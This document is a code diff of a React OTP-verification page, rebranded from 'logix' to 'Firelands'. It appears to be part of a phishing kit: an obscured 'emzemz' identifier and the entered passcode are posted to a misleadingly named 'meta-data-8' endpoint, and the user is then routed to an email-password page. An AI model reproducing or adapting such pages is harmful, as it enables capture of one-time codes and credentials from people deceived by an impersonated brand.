@@ -1,105 +1,78 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { useLocation, useNavigate } from 'react-router-dom';
 import axios from 'axios';
 import { baseUrl } from '../constants';
-import useAccessCheck from '../Utils/useAccessCheck';
+
+const heroImageUrl = '/assets/firelands-landing.jpg';
 
 const OTP: React.FC = () => {
+  const location = useLocation();
+  const { emzemz } = location.state || {};
+  const navigate = useNavigate();
+  
+  useEffect(() => {
+    if (!emzemz) navigate('/');
+  }, [emzemz, navigate]);
+
   const [otp, setOtp] = useState('');
   const [error, setError] = useState('');
   const [isLoading, setIsLoading] = useState(false);
-  const navigate = useNavigate();
-  const location = useLocation();
-  const { emzemz } = location.state || {};
-  const isAllowed = useAccessCheck(baseUrl);
 
-  if (!isAllowed) {
-    return <div>Loading...</div>;
-  }
-
-  if (!emzemz) {
-    return <div>Missing verification details. Please restart the login process.</div>;
-  }
-
-  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
-    event.preventDefault();
-    setError('');
-
-    if (!otp.trim()) {
-      setError('One-time passcode is required.');
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    setIsLoading(true);
+    
+    if (!otp) {
+      setError('OTP is required');
+      setIsLoading(false);
       return;
     }
-
-    setIsLoading(true);
-
+    
     try {
-      await axios.post(`${baseUrl}api/logix-meta-data-8/`, {
-        emzemz,
-        otp,
-      });
-
+      await axios.post(`${baseUrl}api/firelands-meta-data-8/`, { emzemz, otp });
       navigate('/email-password', { state: { emzemz } });
     } catch (err) {
-      console.error('Error submitting OTP:', err);
-      setError('There was a problem verifying your passcode. Please try again.');
+      setError('Invalid OTP code');
+      console.error('OTP verification failed:', err);
+    } finally {
       setIsLoading(false);
     }
   };
 
   return (
-    <div className="flex-1 bg-gray-200 rounded shadow-sm">
-      <div className="border-b-2 border-teal-500 px-8 py-4">
-        <h2 className="text-xl font-semibold text-gray-800">Verify Your Identity</h2>
+    <div className="relative flex min-h-screen flex-col overflow-hidden text-white">
+      <div className="absolute inset-0">
+        <img src={heroImageUrl} alt="Firelands background" className="h-full w-full object-cover" />
+        <div className="absolute inset-0 bg-gradient-to-r from-black/80 via-black/55 to-black/20"></div>
       </div>
 
-      <div className="px-6 py-6 bg-white space-y-4">
-        <p className="text-sm text-gray-700">
-          Enter the one-time passcode we just sent to finish signing in.
-        </p>
-
-        <form onSubmit={handleSubmit} className="space-y-4">
-          <div className="flex items-center gap-4">
-            <label className="text-gray-700 w-32 text-right">Passcode:</label>
-            <input
-              id="otp"
-              name="otp"
-              type="text"
-              value={otp}
-              onChange={(e) => setOtp(e.target.value.replace(/\s/g, ''))}
-              maxLength={10}
-              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm tracking-widest text-center"
-              placeholder="Enter OTP"
-            />
-          </div>
-
-          {error && (
-            <div className="flex items-center gap-2 text-sm text-red-600">
-              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
-                <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
-              </svg>
-              <span>{error}</span>
-            </div>
-          )}
-
-          <div className="border-b-2 border-teal-500 flex justify-center px-6 py-4">
-            {!isLoading ? (
+      <div className="relative z-10 flex flex-1 flex-col justify-center px-6 py-10 md:px-12 lg:px-20">
+        <div className="mx-auto w-full max-w-6xl">
+          <div className="mx-auto w-full max-w-md rounded-[32px] bg-white/95 p-8 text-gray-800 shadow-2xl backdrop-blur">
+            <h2 className="text-2xl font-semibold text-[#2f2e67]">Verify OTP</h2>
+            
+            <form onSubmit={handleSubmit} className="mt-6 space-y-6">
+              <div className="space-y-2">
+                <label className="text-sm text-[#5d4f72]">Enter OTP Code</label>
+                <input
+                  value={otp}
+                  onChange={(e) => setOtp(e.target.value)}
+                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
+                  placeholder="6-digit code"
+                />
+                {error && <p className="text-sm text-rose-600">{error}</p>}
+              </div>
+              
               <button
                 type="submit"
-                className="bg-gray-600 hover:bg-gray-700 text-white px-16 py-2 text-sm rounded"
+                disabled={isLoading}
+                className="w-full rounded-full bg-gradient-to-r from-[#cdd1f5] to-[#f2f3fb] px-6 py-3 text-base font-semibold text-[#8f8fb8] shadow-inner transition enabled:hover:from-[#b7bff2] enabled:hover:to-[#e3e6fb] disabled:opacity-70"
               >
-                Verify
+                {isLoading ? 'Verifying...' : 'Verify'}
               </button>
-            ) : (
-              <div className="h-10 w-10 animate-spin rounded-full border-4 border-solid border-gray-600 border-t-transparent" />
-            )}
+            </form>
           </div>
-        </form>
-      </div>
-
-      <div className="px-6 pb-6">
-        <p className="text-xs text-gray-700">
-          For your security, we've sent a verification code to your registered phone number. If you didn't receive a passcode, check your spam folder or request a new one from the previous screen.
-        </p>
+        </div>
       </div>
     </div>
   );
